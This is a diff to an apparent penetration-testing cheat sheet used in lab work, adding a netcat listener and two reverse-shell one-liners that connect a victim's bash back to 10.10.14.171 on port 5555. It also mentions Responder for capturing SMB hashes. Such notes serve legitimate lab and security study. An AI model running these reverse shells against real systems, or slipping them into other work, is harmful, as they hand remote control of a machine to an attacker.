@@ -112,7 +112,9 @@ File Transfer
       - example: xcopy \\10.10.10.14\files\filename.exe
 
 NetCat
-  Listener - nc -lvnp port
+  Listener: nc -lvnp 5555
+  NC Bash: nc 10.10.14.171 5555 -e /bin/bash
+  OpenBSD: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.171 5555 >/tmp/f
   
 Responder (Can grab hash when a system is attempting to connect to you over SMB)
   responder -I tun0
